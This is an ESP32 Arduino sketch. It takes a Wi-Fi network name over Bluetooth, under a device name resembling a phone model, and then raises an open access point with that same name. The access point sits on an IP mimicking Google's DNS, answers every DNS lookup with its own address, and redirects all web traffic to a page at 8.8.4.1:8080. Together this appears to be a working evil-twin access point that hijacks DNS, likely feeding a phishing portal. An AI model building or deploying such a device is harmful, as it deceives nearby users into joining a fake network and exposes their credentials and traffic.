#include "BluetoothSerial.h" //Header File for Serial Bluetooth, will be added by default into Arduino
#include <EEPROM.h>

#define LED_BUILTIN 2 
#include <WiFi.h>
#include <DNSServer.h>


const byte DNS_PORT = 53;
IPAddress apIP(8,8,4,4); // The default android DNS
DNSServer dnsServer;
WiFiServer server(80);

String responseHTML = """"
"<!DOCTYPE html>\n"
"<html>\n"
"<body onload=\"myFunction()\">\n"
"<!-- \n"
"<h2>Redirect to a Webpage</h2>\n"
"<p>The replace() method replaces the current document with a new one:</p>\n"
"\n"
"<button onclick=\"myFunction()\">Replace document</button> -->\n"
"\n"
"<script>\n"
"function myFunction() {\n"
"  location.replace(\"http://8.8.4.1:8080/index.html\")\n"
"}\n"
"</script>\n"
"\n"
"</body>\n"
"</html> \n"
"";

BluetoothSerial ESP_BT; //Object for Bluetooth
String buffer_in;
unsigned long previousMillis = 0; 
byte val;       
int addr = 0;
byte indS=0;
byte indP=0;
String stream;
byte len=0;
String temp;
String temp2;
unsigned int interval=30000;


void setup() {
  pinMode(LED_BUILTIN, OUTPUT);

  EEPROM.begin(50);
  Serial.begin(9600); //Start Serial monitor in 9600
  Serial.println("Bluetooth Device is Ready to Pair");

    Serial.println("Waiting For Wifi Updates 30 seconds");
    ESP_BT.begin("SM-M215F"); //Name of your Bluetooth Signal

while(!check_wifiUpdate()==true)
{
  }


    
Serial.println("The Stored Wifi credetial are : ");
for(int i=0;i<50;i++)
 {
    val=EEPROM.read(i);
    stream+=(char)val;
 
if((val==10) && (indS==0))
{
  indS=i;
//Serial.println("indS"+(String)i);
}
  else if(val==10 && indP==0)
  {
    indP=i;
    break;
//Serial.println("indP"+(String)i);
  }
}


// Serial.println(stream);
// Serial.println("Stream Ended");
 temp=stream.substring(0,indS);
 temp=temp.substring(5,indS);


//ssid2=ssid;
temp2=stream.substring(indS+1,indP);
temp2=temp2.substring(5,indP-indS);



  


int i=temp.length();
int j=temp2.length();
char ssid[i];
char pass[j]; 
temp.toCharArray(ssid,i);
temp2.toCharArray(pass,j);



  Serial.println("Stored SSID");
  Serial.println(ssid);
    Serial.println("Stored PASS");
  Serial.println(pass);


// WiFi.mode(WIFI_STA);
// WiFi.begin(ssid, pass);



WiFi.mode(WIFI_AP);
  WiFi.softAP(ssid);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));

  

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);

  server.begin();

  // if (WiFi.waitForConnectResult() != WL_CONNECTED) 
  // {
  //       Serial.println("WiFi Failed");
  //       while(1) {
  //           delay(1000);
  //       }
  // }
  //   else 
  //   {
  //     Serial.print("Wifi Connected to ");
  //     Serial.println(ssid);

  //   }
}



boolean check_wifiUpdate()
{
  unsigned long currentMillis = millis();

  if (currentMillis - previousMillis >= interval) 
  {
    previousMillis = currentMillis;
   

    Serial.println("30 Seconds Over");

    return true;
  }

  else if (ESP_BT.available()) //Check if we receive anything from Bluetooth
  {
    interval=50000;
    buffer_in = ESP_BT.readStringUntil('\n'); //Read what we recevive 
    //Serial.println("Received:"); Serial.println(buffer_in);
    delay(20);
 

  if(buffer_in.charAt(0)=='S')
  {
    for(int i=0;i<buffer_in.length();i++)
    {
      val=(byte)(buffer_in.charAt(i));
      //Serial.println("val "+val);

      EEPROM.write(addr, val);
      //Serial.println(val);
      addr++;
    }
    //Serial.print("New ");
    //Serial.print(buffer_in);
    EEPROM.write(addr, 10);
    addr++;
    EEPROM.commit();     
    ESP_BT.println("SSID Stored");
  }

    else if(buffer_in.charAt(0)=='P')
    {
      for(int i=0;i<buffer_in.length();i++)
      {
        val=(byte)(buffer_in.charAt(i));
        //Serial.println("val "+val);
        EEPROM.write(addr, val);
        //Serial.println(val);
        addr++;
      
      }
      //Serial.print("New ");
      //Serial.print(buffer_in);
      EEPROM.write(addr, 10);
      EEPROM.commit();  
      ESP_BT.println("Password Stored"); 
      return true;
    }  
 
    return false;
  }

  else
  { 
    return false;
  }
}
  



void loop() {

  pinMode(LED_BUILTIN, OUTPUT);

  
  dnsServer.processNextRequest();
  WiFiClient client = server.available();   // listen for incoming clients

  if (client) {
    String currentLine = "";
    while (client.connected()) {
      if (client.available()) {
        char c = client.read();
        if (c == '\n') {
          if (currentLine.length() == 0) {
            client.println("HTTP/1.1 200 OK");
            client.println("Content-type:text/html");
            client.println();
            client.print(responseHTML);
            break;
          } else {
            currentLine = "";
          }
        } else if (c != '\r') {
          currentLine += c;
        }
      }
    }
    client.stop();
  }


}
